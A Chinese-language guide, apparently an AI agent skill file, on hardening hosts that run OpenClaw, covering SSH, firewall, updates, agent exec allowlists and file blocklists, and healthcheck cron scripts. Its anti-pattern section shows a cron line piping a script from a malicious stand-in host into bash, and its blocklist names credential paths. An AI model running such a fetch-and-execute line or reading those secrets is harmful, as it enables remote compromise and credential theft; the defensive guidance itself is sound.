---
title: 主机安全加固与风险配置
domain: coding/infra
keywords: [healthcheck, 健康检查, 安全审计, 防火墙, SSH 加固, 系统更新, 风险配置, 安全加固, 暴露审查, OpenClaw cron, 版本状态检查, 安全扫描]
triggers: [安全审计, 防火墙配置, SSH 安全, 系统更新, 风险审查, 暴露审查, OpenClaw 安全检查, 版本状态检查, 主机加固, 安全配置, 漏洞扫描]
scope: 为运行 OpenClaw 的部署（笔记本、工作站、Pi、VPS）进行主机安全加固和风险容忍度配置
---

# 主机安全加固与风险配置

## 核心原则

1. **最小权限原则** - 只授予必要的访问权限，定期审查和撤销多余权限
2. **纵深防御** - 多层安全控制，单一防线失效不影响整体安全
3. **定期更新** - 保持系统和应用更新，及时修补安全漏洞
4. **监控与审计** - 持续监控系统活动，定期审计配置和日志
5. **风险平衡** - 在安全性和可用性之间找到适当平衡，避免过度限制

## 规范细则

### 安全检查工作流

**步骤 1：初始风险评估**
```bash
# 检查系统基本信息
uname -a
cat /etc/os-release
hostname
whoami

# 检查网络暴露
ip addr show
ss -tulpn
netstat -tulpn  # 如果 ss 不可用
```

**步骤 2：SSH 安全加固**
```bash
# 备份原始配置
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.$(date +%Y%m%d)

# 编辑 SSH 配置
sudo nano /etc/ssh/sshd_config
```

**推荐 SSH 配置**：
```
# 禁用 root 登录
PermitRootLogin no

# 使用密钥认证，禁用密码
PasswordAuthentication no
PubkeyAuthentication yes

# 限制用户和 IP
AllowUsers yourusername
AllowGroups sshusers
# 或使用 AllowFrom 限制 IP（如果适用）

# 使用强加密算法
KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com

# 其他安全设置
Protocol 2
ClientAliveInterval 300
ClientAliveCountMax 2
MaxAuthTries 3
MaxSessions 10
```

**步骤 3：防火墙配置**
```bash
# Ubuntu/Debian (ufw)
sudo ufw --force enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 443/tcp  # HTTPS
sudo ufw allow 80/tcp   # HTTP（如果需要）
sudo ufw status verbose

# CentOS/RHEL (firewalld)
sudo firewall-cmd --permanent --add-service=ssh
sudo firewall-cmd --permanent --add-service=https
sudo firewall-cmd --permanent --add-service=http  # 如果需要
sudo firewall-cmd --reload
sudo firewall-cmd --list-all

# 通用 iptables（备用）
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 如果需要
sudo iptables -A INPUT -j DROP
```

**步骤 4：系统更新与补丁**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt upgrade -y
sudo apt autoremove -y

# CentOS/RHEL
sudo yum update -y
sudo yum autoremove -y

# 检查关键服务更新
sudo apt list --upgradable 2>/dev/null | grep -E "(openssh|nginx|apache|docker|containerd)"
```

**步骤 5：OpenClaw 特定检查**
```bash
# 检查 OpenClaw 状态
openclaw status
openclaw gateway status

# 检查配置安全性
openclaw config get --path security
openclaw config get --path channels

# 检查 cron 作业
openclaw cron list
```

**步骤 6：用户和权限审计**
```bash
# 检查用户
cat /etc/passwd
cat /etc/group

# 检查 sudo 权限
sudo -l

# 检查文件权限
find /home -type f -perm /o+rwx 2>/dev/null
find /etc -type f -perm /o+rwx 2>/dev/null
```

### OpenClaw 安全配置

**风险容忍度配置**：
```yaml
# ~/.openclaw/config.yaml 或项目配置
security:
  # 执行安全模式
  exec:
    # deny: 完全禁止 exec
    # allowlist: 只允许白名单中的命令
    # full: 允许所有命令（高风险）
    mode: allowlist
    
    # 白名单命令（mode: allowlist 时生效）
    allowlist:
      - git
      - npm
      - pnpm
      - yarn
      - python
      - python3
      - pip
      - pip3
      - docker  # 谨慎启用
      - kubectl  # 谨慎启用
  
  # 文件访问限制
  files:
    # 禁止访问的路径
    blocklist:
      - /etc/passwd
      - /etc/shadow
      - /root
      - ~/.ssh
      - ~/.aws
      - ~/.kube
    
    # 允许访问的路径（覆盖 blocklist）
    allowlist:
      - ~/projects  # 项目目录
      - /tmp        # 临时目录
  
  # 网络访问限制
  network:
    # 允许的域名（用于 web_fetch/web_search）
    allowedDomains:
      - github.com
      - npmjs.com
      - pypi.org
      - docker.io
      - hub.docker.com
    
    # 禁止的 IP 范围
    blocklistRanges:
      - 10.0.0.0/8
      - 172.16.0.0/12
      - 192.168.0.0/16
      - 127.0.0.0/8
```

**通道安全配置**：
```yaml
channels:
  # 每个通道的权限配置
  telegram:
    enabled: true
    # 允许的命令
    allowedCommands:
      - status
      - help
      - echo
    # 禁止的命令
    blockedCommands:
      - exec
      - config
      - update
  
  webchat:
    enabled: true
    # Webchat 通常有更高权限（本地访问）
    security:
      requireLocalhost: true  # 只允许本地访问
      rateLimit: 10           # 每分钟请求限制
```

### 定期检查脚本

**创建健康检查 cron 作业**：
```bash
# 创建检查脚本
cat > ~/healthcheck.sh << 'EOF'
#!/bin/bash
# OpenClaw 健康检查脚本

LOG_FILE="/tmp/openclaw-healthcheck-$(date +%Y%m%d).log"

{
    echo "=== OpenClaw 健康检查 $(date) ==="
    
    # 1. 检查 OpenClaw 服务状态
    echo "1. OpenClaw 服务状态:"
    if systemctl is-active --quiet openclaw; then
        echo "   ✅ OpenClaw 服务运行中"
    else
        echo "   ❌ OpenClaw 服务未运行"
    fi
    
    # 2. 检查网关状态
    echo "2. 网关状态:"
    openclaw gateway status 2>&1
    
    # 3. 检查磁盘空间
    echo "3. 磁盘空间:"
    df -h / | tail -1
    
    # 4. 检查内存使用
    echo "4. 内存使用:"
    free -h
    
    # 5. 检查最近错误
    echo "5. 最近错误日志:"
    journalctl -u openclaw --since "24 hours ago" | grep -i error | tail -5
    
    echo "=== 检查完成 ==="
} | tee -a "$LOG_FILE"

# 发送通知（如果配置了通知）
if command -v openclaw &> /dev/null; then
    openclaw system event --text "健康检查完成。查看日志: $LOG_FILE" --mode now
fi
EOF

chmod +x ~/healthcheck.sh

# 添加到 cron（每天凌晨2点运行）
(crontab -l 2>/dev/null; echo "0 2 * * * $HOME/healthcheck.sh") | crontab -
```

**安全扫描脚本**：
```bash
# 创建安全扫描脚本
cat > ~/security-scan.sh << 'EOF'
#!/bin/bash
# 基础安全扫描脚本

echo "=== 安全扫描 $(date) ==="

# 检查可疑进程
echo "1. 检查可疑进程:"
ps aux | grep -E "(miner|crypto|backdoor|malware)" | grep -v grep || echo "   未发现可疑进程"

# 检查异常网络连接
echo "2. 检查异常网络连接:"
ss -tulpn | grep -E ":(25|587|465|1433|3306|5432|27017)" || echo "   未发现异常数据库端口"

# 检查计划任务
echo "3. 检查计划任务:"
crontab -l
ls -la /etc/cron.*/

# 检查SUID文件
echo "4. 检查SUID文件:"
find / -type f -perm /4000 -ls 2>/dev/null | head -20

# 检查世界可写文件
echo "5. 检查世界可写文件:"
find /home -type f -perm /o+w -ls 2>/dev/null | head -10

echo "=== 扫描完成 ==="
EOF

chmod +x ~/security-scan.sh
```

### OpenClaw Cron 安全调度

**创建定期安全任务**：
```bash
# 添加每周安全扫描任务
openclaw cron add --json '{
  "name": "weekly-security-scan",
  "schedule": {
    "kind": "cron",
    "expr": "0 3 * * 0",  # 每周日凌晨3点
    "tz": "Asia/Shanghai"
  },
  "payload": {
    "kind": "agentTurn",
    "message": "运行安全扫描：1. 检查系统更新 2. 检查OpenClaw日志 3. 审查用户权限 4. 检查防火墙规则。完成后总结发现的问题和建议。"
  },
  "sessionTarget": "isolated",
  "delivery": {
    "mode": "announce",
    "channel": "webchat"
  }
}'
```

### 风险容忍度级别

**低风险配置**（推荐用于生产环境）：
- `exec.mode: allowlist` - 只允许白名单命令
- 严格的文件访问限制
- 网络访问仅限于可信域名
- 定期自动安全扫描
- 所有操作需要批准

**中风险配置**（开发环境）：
- `exec.mode: allowlist` - 但白名单更宽松
- 适度的文件访问限制
- 网络访问包括开发相关域名
- 定期但不频繁的安全扫描
- 危险操作需要批准

**高风险配置**（仅测试/沙箱环境）：
- `exec.mode: full` - 允许所有命令
- 最小文件访问限制
- 宽松的网络访问
- 手动安全扫描
- 操作通常自动批准

## 反例（Anti-patterns）

**❌ 使用弱SSH配置**：
```
# 错误配置
PermitRootLogin yes
PasswordAuthentication yes
Protocol 1  # 已废弃
# 缺少加密算法限制
```

**❌ 禁用防火墙**：
```bash
# 错误：完全禁用防火墙
sudo ufw disable
# 或
sudo systemctl stop firewalld
```

**❌ 不更新系统**：
```bash
# 错误：忽略安全更新
# 从不运行 apt update/upgrade
```

**❌ 过度宽松的OpenClaw配置**：
```yaml
security:
  exec:
    mode: full  # 允许所有命令，高风险
    
  files:
    blocklist: []  # 无文件访问限制
    
  network:
    allowedDomains: ["*"]  # 允许所有域名
```

**❌ 在cron中使用危险命令**：
```bash
# 错误：cron中运行危险命令
0 * * * * curl http://malicious-site.com/script.sh | bash
```

**❌ 使用默认或弱密码**：
```bash
# 错误：使用默认凭证
# 用户：root，密码：root
# 或简单密码：123456, password, admin
```

## 适用场景

**适合使用此技能**：
- 用户请求安全审计或风险评估
- 配置防火墙或SSH加固
- 设置系统更新策略
- 审查OpenClaw风险配置
- 设置定期健康检查cron作业
- 检查运行OpenClaw的机器的版本状态

**不适合使用此技能**：
- 详细的安全事件响应（需要专门的安全工具）
- 复杂的网络架构安全（需要网络专家）
- 合规性审计（需要特定合规框架）
- 恶意软件深度分析（需要专业安全软件）

## 检查清单

**快速安全检查清单**：
- [ ] SSH配置已加固（禁用root，使用密钥）
- [ ] 防火墙已启用并正确配置
- [ ] 系统已更新到最新版本
- [ ] 不必要的服务已禁用
- [ ] 用户权限已审查
- [ ] OpenClaw配置符合风险容忍度
- [ ] 定期备份已设置
- [ ] 监控和日志已配置

**OpenClaw特定检查**：
- [ ] `openclaw status` 显示正常
- [ ] 通道安全配置适当
- [ ] exec模式匹配环境风险
- [ ] 文件访问限制已设置
- [ ] 网络访问限制适当
- [ ] cron作业安全审查
